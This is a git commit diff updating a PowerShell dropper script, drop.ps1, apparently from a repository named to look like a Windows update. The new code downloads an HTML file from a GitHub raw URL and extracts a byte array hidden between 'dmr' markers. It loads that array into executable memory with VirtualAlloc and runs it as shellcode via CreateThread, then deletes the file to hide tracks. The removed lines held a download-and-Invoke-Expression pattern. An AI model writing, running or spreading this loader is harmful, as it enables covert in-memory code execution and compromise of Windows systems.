2f8477e5b4472747f6108086e4823e320498b9b3
gwyn1869 <gplaine53@gmail.com>
2026-03-18 14:34:28 +0200

    Update drop.ps1

--- drop.ps1
+++ drop.ps1
@@ -1,11 +1,31 @@
-$blobPath = "C:\Users\Public\Downloads\test.html"
-$blobUrl = "https://raw.githubusercontent.com/gwyn1869/winupdate/main/test.html"
-$logicUrl = "https://raw.githubusercontent.com/gwyn1869/winupdate/main/logic.txt"
+# 1. Paths and URLs
+$htmlPath = "$env:TEMP\test.html" # Using TEMP is less suspicious than Downloads
+$htmlUrl = "https://raw.githubusercontent.com/gwyn1869/winupdate/main/test.html"
 
-# 1. Save the .html file using specified parameters
-Invoke-WebRequest -UseDefaultCredentials -UseBasicParsing -Uri $blobUrl -OutFile $blobPath
+# 2. Download the HTML Blob
+Invoke-WebRequest -Uri $htmlUrl -OutFile $htmlPath -UseBasicParsing
 
-# 2. Retrieve and run the logic script
-# In a real attack, this downloads the text from $logicUrl and pipes it to IEX
-$remoteLogic = (Invoke-WebRequest -UseDefaultCredentials -UseBasicParsing -Uri $logicUrl).Content
-Invoke-Expression -Command $remoteLogic
+# 3. Extract and Reassemble the Byte Array
+$htmlContent = Get-Content $htmlPath -Raw
+$pattern = '(?<=dmr)(.*?)(?=dmr)'
+$match = [regex]::Match($htmlContent, $pattern).Value
+$byteArray = $match.Split("dmr") | ForEach-Object { [byte]$_ }
+
+# 4. The Shellcode Loader (Runs in RAM)
+$kernel32 = Add-Type -MemberDefinition @"
+    [DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+    [DllImport("kernel32.dll")] public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+"@ -Name "Win32" -Namespace Win32 -PassThru
+
+# Allocate Memory (0x1000 = Commit, 0x2000 = Reserve | 0x40 = ExecuteReadWrite)
+$size = [uint32]$byteArray.Length
+$address = $kernel32::VirtualAlloc([IntPtr]::Zero, $size, 0x3000, 0x40)
+
+# Copy Shellcode to Allocated Memory
+[System.Runtime.InteropServices.Marshal]::Copy($byteArray, 0, $address, $size)
+
+# Execute the Shellcode as a new Thread
+$kernel32::CreateThread([IntPtr]::Zero, 0, $address, [IntPtr]::Zero, 0, [IntPtr]::Zero)
+
+# Cleanup the HTML file to hide tracks
+Remove-Item $htmlPath -Force
